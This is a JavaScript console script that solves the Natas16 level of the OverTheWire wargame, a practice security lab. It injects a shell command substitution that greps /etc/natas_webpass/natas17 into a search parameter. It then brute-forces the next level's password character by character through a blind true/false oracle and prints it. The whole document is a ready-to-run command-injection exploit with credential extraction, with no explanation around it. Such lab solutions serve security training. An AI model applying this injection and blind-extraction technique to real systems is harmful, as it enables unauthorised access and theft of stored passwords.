/**
 * Usage: 
 *  - Navigate to Natas16 page, log in.
 *  - Open a devConsole with F12
 *  - Copy-paste this code into the console and hit enter
 * (It will use the pre-authed session)
 * It will take ~20 seconds to churn through the character combinations
 */
(async function Natas16Brute(){

    const baseUrl = 'http://natas16.natas.labs.overthewire.org/index.php?'

    function createParamString(string){
        return 'needle=' + encodeURIComponent(`$(grep ^${string}$ /etc/natas_webpass/natas17)^B$`);
    }

    `Output:
    <pre>
    B
    </pre>`

    const reFalse = /<pre>\s*B\s*<\/pre>/

    function pageSuccess (html){
        if(reFalse.test(html)){
            return false
        } else {
            return true
        }

    }
    
    
    //Get password length:
    let passwordLengthFound =false;
    let passwordLength = 0;
    while ( (!passwordLengthFound) && passwordLength < 100){
        //Send request:
        const requestUrl = baseUrl + createParamString(''.padStart(passwordLength, '.'));
        const html = await (await fetch(requestUrl)).text();
        if (pageSuccess(html)){
            passwordLengthFound = true;
        } else {
            passwordLength++;
        }
    }
    if (passwordLength >= 100){
        throw new Error(`Password length determination failed, exited at 100 for safety`);
    }
    
    console.log(`Password found to be ${passwordLength} chars long`);
    
    //Set possible password characters:
    const alphaNum = (new Array(36)).fill(0).map((x,i)=> i.toString(36)).join('');
    const alphaWithCaps = alphaNum + alphaNum.toUpperCase().substr(10);

    //Get password:
    let pass = '';
    for(let i=0; i<passwordLength; i++){
        let charDetermined = false;
        let j=0;
        while (!charDetermined && j < alphaWithCaps.length){
            const passAttempt = `${pass}${alphaWithCaps[j]}`;
            const html = await (await fetch(baseUrl + createParamString(`${passAttempt}.*`))).text();
            if (pageSuccess(html)) {
                pass = passAttempt;
                charDetermined = true;
            } else {
                j++;
            }
        }
        console.log(`Cracked up to:\t ${pass.padEnd(passwordLength,'*')}`);
    }
    console.log(`Username: natas17\nPassword: ${pass}`);

})();